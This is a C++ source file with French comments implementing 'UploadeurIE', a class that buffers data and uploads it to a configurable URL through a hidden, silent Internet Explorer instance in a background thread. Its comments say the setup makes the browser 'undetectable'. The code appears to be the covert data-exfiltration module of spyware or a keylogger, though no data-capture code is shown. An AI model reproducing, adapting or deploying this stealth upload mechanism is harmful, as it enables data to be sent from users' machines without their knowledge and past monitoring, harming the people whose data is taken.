/*!
* \file UploadeurIE.cpp
* Fichier source de la classe UploadeurIE.
* \author Xavier Monin
* \date 30/10/2008
*/

#include "UploadeurIE.h"

#include <string>
#include <vector>
#include <Exdisp.h>
#include <atlbase.h>
#include <sstream>

#include <iostream>

//! Variable globale pour les sections critiques
CRITICAL_SECTION critical_section;

/*!
* \brief Constructeur de UploadeurIE.
* \param[in] url : Site à contacter
* \param[in] methode : POST? GET? FILE?
* \param[in] element : Utilisé seulement pour POST et FILE. C'est le nom du contenant (ex: Accès en PHP: $_POST['$element'])
* \param[in] taille : Taille du buffer (2048 octets par défaut). Lorsque cette taille est atteinte, les données sont envoyées
*/
UploadeurIE::UploadeurIE(std::string url, METHODE_ENVOI methode, 
									   std::string element, size_t taille)
									   : taille_buffer(taille), string_url(url),
									   methode_envoi(methode), string_element(element),
									   thread_en_cours(false)
{
	// Initialise la variable pour les sections critiques (=> synchronisation thread)
	InitializeCriticalSection(&critical_section);
}

/*!
* \brief Destructeur de UploadeurIE.
*/
UploadeurIE::~UploadeurIE()
{
	// Si le buffer est encore plein on envoi son contenu
	if (!vector_buffer.empty())
		mettreEnLigneBufferSansThread();
}

/*!
* \brief Mets en ligne le buffer par un thread.
* Mets en ligne le buffer par un thread. Il est ainsi possible de remplir le buffer pendant qu'il s'envoi
*/
void UploadeurIE::creerThread()
{
	if (thread_en_cours)
		return; // Un thread a déja été lancé, on n'en crée pas un autre

	DWORD thread=0;
	if (CreateThread(NULL, NULL, UploadeurIE::mettreEnLigneBufferAvecThread, (LPVOID)this, NULL, &thread))
		thread_en_cours=true; // Le thread est lancé
}


/*!
* \brief Envoi les données périodiquement.
* Envoi les données en ligne si le buffer est plein sinon stock les données dans le buffer
* Fonction surchargée acceptant les chaines string
* \param[in] chaine : Données à envoyer
*/
void UploadeurIE::envoyerDonnees(const std::string& chaine)
{
	size_t longueur_totale=vector_buffer.size()+chaine.size();

	std::cout << chaine.c_str();

	// Conversion de la chaine string en vector<char>
	ListeChars donnees=stringVersVector(chaine);

	// On envoi les données si le buffer est plein sinon on ajoute les données au buffer
	if ( longueur_totale >= taille_buffer )
		envoyerDonneesMaintenant(chaine);
	else
	{
		// On rempli le buffer dans une partie critique
		// pour ne pas le modifier en même temps que le thread le lit
		EnterCriticalSection(&critical_section);
		vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end());
		LeaveCriticalSection(&critical_section);
	}
}

/*!
* \brief Envoi directement les données.
* Fonction surchargée acceptant les chaines string
* \param[in] chaine : Données à envoyer
*/
void UploadeurIE::envoyerDonneesMaintenant(const std::string& chaine)
{
	if (!chaine.empty())
	{
		// Conversion de string vers vector<char>
		ListeChars donnees=stringVersVector(chaine);

		// On ajoute les données au buffer dans une partie critique
		// puisqu'il y a un risque que le thread le lise en même temps qu'il se remplisse
		EnterCriticalSection(&critical_section);
		vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end());
		LeaveCriticalSection(&critical_section);
	}

	// On crée le thread
	creerThread();
}

/*!
* \brief Envoi directement les données.
* Fonction surchargée acceptant les vector<char>
* \param[in] donnees : Données à envoyer
*/
void UploadeurIE::envoyerDonneesMaintenant(const ListeChars& donnees)
{
	// On ajoute les données au buffer dans une partie critique
	// puisqu'il y a un risque que le thread le lise en même temps qu'il se remplisse
	EnterCriticalSection(&critical_section);
	vector_buffer.insert(vector_buffer.end(), donnees.begin(), donnees.end()); 
	LeaveCriticalSection(&critical_section);

	// On crée le thread
	creerThread();
}

/*!
* \brief Thread mettant en ligne le buffer.
* \param[in,out] objet : Objet UploadeurIE sur lequel le thread s'applique
* \return 0
*/
DWORD UploadeurIE::mettreEnLigneBufferAvecThread(LPVOID objet)
{
	// Transtype en objet UploadeurIE
	UploadeurIE *mettre_en_ligne = (UploadeurIE*) objet;

	// On copie le buffer dans le buffer d'envoi et on efface le buffer
	// C'est ce buffer d'envoi qui sera envoyé
	// Celà permet de continuer à remplir le buffer pendant qu'on envoi l'autre
	// Cette opération ce fait dans une section critique
	// puisque le buffer peut être modifier pendant qu'il est copié
	EnterCriticalSection(&critical_section);
	mettre_en_ligne->vector_buffer_envoi = mettre_en_ligne->vector_buffer;
	mettre_en_ligne->vector_buffer.clear();
	LeaveCriticalSection(&critical_section);

	if (!mettre_en_ligne->mettreEnLigneBuffer())
	{
		// Le buffer n'a pa pu être mis en ligne
		// On remet le buffer d'envoi dans le buffer
		// Toujours dans une section critique à cause des modifications
		EnterCriticalSection(&critical_section);
		mettre_en_ligne->vector_buffer.insert(mettre_en_ligne->vector_buffer.begin(),
											  mettre_en_ligne->vector_buffer_envoi.begin(),
											  mettre_en_ligne->vector_buffer_envoi.end());
		LeaveCriticalSection(&critical_section);
	}

	// Vide le buffer d'envoi
	// Le thread s'est terminé
	// Toujours dans une section critique à cause des modifications
	EnterCriticalSection(&critical_section);
	mettre_en_ligne->vector_buffer_envoi.clear();
	mettre_en_ligne->thread_en_cours=false;
	LeaveCriticalSection(&critical_section);

	return 0;
}

/*!
* \brief Met en ligne sans thread.
* Met en ligne le buffer sans utiliser de thread, et donc bloquant
* \return true si tout s'est bien déroulé
*/
bool UploadeurIE::mettreEnLigneBufferSansThread()
{
	bool deroulement;

	// On remplie le buffer d'envoi
	vector_buffer_envoi = vector_buffer;
	
	// On met en ligne
	deroulement = mettreEnLigneBuffer();

	if (deroulement)
		vector_buffer.clear(); // Tout s'est bien passé, on efface le buffer

	vector_buffer_envoi.clear();

	return deroulement;
}

/*!
* \brief Met en ligne les données.
* \return true si tout c'est bien passé, sinon false
*/
bool UploadeurIE::mettreEnLigneBuffer()
{
	// Initialise COM
	CoInitialize(NULL);

	bool valeur_retour;

	IWebBrowser2 * pBrowser2 = NULL;

	// Création de l'instance Internet Explorer. CLSCTX_ENABLE_CLOAKING le rend indétectable
	CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_ENABLE_CLOAKING | CLSCTX_LOCAL_SERVER, 
                   IID_IWebBrowser2, (void**)&pBrowser2);

	if (pBrowser2)
	{
		HRESULT hr;

		// Internet Explorer ne doit pas être visible et ne pas afficher d'erreur !
		pBrowser2->put_Silent(VARIANT_TRUE);
		pBrowser2->put_Visible(VARIANT_FALSE);


		// Création d'un VARIANT vide
		CComVariant vEmpty;

		// URL
		BSTR bstr_url;

		// Header
		CComVariant vHeader;
		vHeader.vt = VT_BSTR;
		vHeader.bstrVal=0;

		// POST
		CComVariant postData;

		// GET
		std::string string_get;

		if (extension != NULL)
		{
			(*extension) << vector_buffer_envoi;
			vector_buffer_envoi = extension->resultat();
		}

		// POST? FILE ? GET?
		switch(methode_envoi)
		{
			case METHODE_POST:
				{
					std::string buffer = encoderURL(vectorVersString(vector_buffer_envoi));

					buffer = encoderURL(string_element)+"="+buffer;

					stringVersVariantArray(buffer, postData);

					// HEADER pour methode POST
					stringVersBSTR("Content-Type: application/x-www-form-urlencoded", &vHeader.bstrVal);
					break;
				}
			case METHODE_FILE:
				{
					std::string buffer="--AaB03x\r\n";
					ListeChars donnees;
					buffer+="content-disposition: ";
					// Le nom du fichier aura le même nom que l'élément
					buffer+="form-data; name=\""+encoderURL(string_element)+"\"; filename=\""+ string_element +"\"\r\n";
					buffer+="Content-Transfer-Encoding: binary\r\n\r\n";
					donnees = stringVersVector(buffer);
					// Ajoute au début du buffer les indications de la méthode FILE
					vector_buffer_envoi.insert(vector_buffer_envoi.begin(), donnees.begin(), donnees.end());

					// Ajoute à la fin du buffer l'indication de fin de la méthode FILE
					buffer="\r\n--AaB03x--";
					donnees = stringVersVector(buffer);
					vector_buffer_envoi.insert(vector_buffer_envoi.end(), donnees.begin(), donnees.end());

					vectorVersVariantArray(vector_buffer_envoi, postData);

					// HEADER pour methode FILE
					stringVersBSTR("Content-type: multipart/form-data, boundary=AaB03x", &vHeader.bstrVal);
					break;
				}
			case METHODE_GET:
				{
					std::string get = encoderURL(vectorVersString(vector_buffer_envoi));
					string_get = "/?"+encoderURL(string_element)+"="+get;
				}
		}

		// Création du lien vers le site (URL)
		stringVersBSTR(string_url+string_get, &bstr_url);

		// On met en ligne !
		hr = (pBrowser2->Navigate(bstr_url, &vEmpty, &vEmpty, &postData, &vHeader));

		// Libération de la mémoire
		if (bstr_url)
			SysFreeString(bstr_url);
		if (vHeader.bstrVal)
			SysFreeString(vHeader.bstrVal);

		VARIANT_BOOL occupe = VARIANT_TRUE;

		// On attend que les données soient envoyées
		while(occupe == VARIANT_TRUE)
		{
			Sleep(100);
			pBrowser2->get_Busy(&occupe);
		}

		// On ferme Internet Explorer
		pBrowser2->Quit();

		// On libère la mémoire de l'instance
		pBrowser2->Release();

		valeur_retour = SUCCEEDED(hr);
	}
	else
		valeur_retour=false;

	// On n'utilise plus COM
	CoUninitialize();

	return valeur_retour;
}

/*!
* \brief Encode un texte en URL.
* Encode un texte en URL (Ex: "Bonjour, comment allez vous ?" => "Bonjour%2c%20comment%20allez%20vous%20%3f")
* \param[in] texte : Texte à encoder
* \return string encodé
*/
std::string UploadeurIE::encoderURL(const std::string texte)
{
	std::string encode;
	for (size_t i=0; i<texte.size(); i++)
	{
		if ( (texte[i]>='0' && texte[i]<='9') || (texte[i]>='A' && texte[i]<='Z') || (texte[i]>='a' && texte[i]<='z') )
		{
			// Pas besoin d'encoder les alphanumeriques
			encode += texte[i];
			continue;
		}

		// Encodage en hexadécimal
		std::ostringstream chaine_hexa;
		chaine_hexa << std::hex << ((size_t)texte[i])%256; // %256 permet de se limiter à 1 octet. % => cyclique

		encode += '%';
		encode += chaine_hexa.str();
	}
	return encode;
}

/*!
* \brief Converti un string en CComVariant.
* Crée un CComVariant Array (un tableau) à partir d'un string (chaine de caractère)
* \param[in] chaine : La chaine de caractères qui sera converti
* \param[out] variant_array : Référence sur le CComVariant qui sera chargé
*/
void UploadeurIE::stringVersVariantArray(const std::string & chaine, CComVariant & variant_array)
{
	int longueur = chaine.size();
	// variant_array est un tableau (VT_ARRAY) de la taille de chaine
	variant_array.vt = VT_ARRAY;
	variant_array.parray = SafeArrayCreateVector(VT_UI1, 0, longueur);

	// On copie (par memcpy) chaine dans variant_array via donnes_proteges qui pointe sur variant_array
	void * donnes_proteges;
	SafeArrayAccessData(variant_array.parray, &donnes_proteges);
	memcpy(donnes_proteges, chaine.c_str(), longueur);
	SafeArrayUnaccessData(variant_array.parray);
}

/*!
* \brief Converti un vector<char> en CComVariant.
* Crée un CComVariant Array (un tableau) à partir d'un vector<char> (tableau de caractères)
* \param[in] donnees : Le tableau de caractères qui sera converti
* \param[out] variant_array : Référence sur le CComVariant qui sera chargé
*/
void UploadeurIE::vectorVersVariantArray(const ListeChars & donnees, CComVariant & variant_array)
{
	int longueur = donnees.size();

	// variant_array est un tableau (VT_ARRAY) de la taille de chaine
	variant_array.vt = VT_ARRAY;
	variant_array.parray = SafeArrayCreateVector(VT_UI1, 0, longueur);

	// On copie (par memcpy) donnees dans variant_array via donnes_proteges qui pointe sur variant_array
	void * donnes_proteges;
	SafeArrayAccessData(variant_array.parray, &donnes_proteges);
	memcpy(donnes_proteges, &donnees[0], longueur);
	SafeArrayUnaccessData(variant_array.parray);
}

/*!
* \brief Converti un string en BSTR.
* Crée un BSTR (chaine de caractère unicode) à partir d'un string (chaine de caractère ASCI)
* \param[in] chaine : La chaine de caractère qui sera converti
* \param[out] bstr : Pointeur sur BSTR qui sera chargé. A noter que ce pointeur doit être libéré après utilisation !
*/
void UploadeurIE::stringVersBSTR(const std::string chaine, BSTR * bstr)
{
	if (!chaine.empty())
	{
		unsigned long longueur_chaine = chaine.size();

		// On calcul la taille que devra avoir le bstr pour contenir chaine
		int longueur_bstr = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, reinterpret_cast <const char *>(chaine.c_str()),
												longueur_chaine, NULL, 0);

		// On alloue la place à bstr
		*bstr = SysAllocStringLen(NULL, longueur_bstr);
        
		// On copie chaine dans bstr (en le convertissant)
		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, reinterpret_cast <const char *>(chaine.c_str()),
							longueur_chaine, *bstr, longueur_bstr); 
    }
}
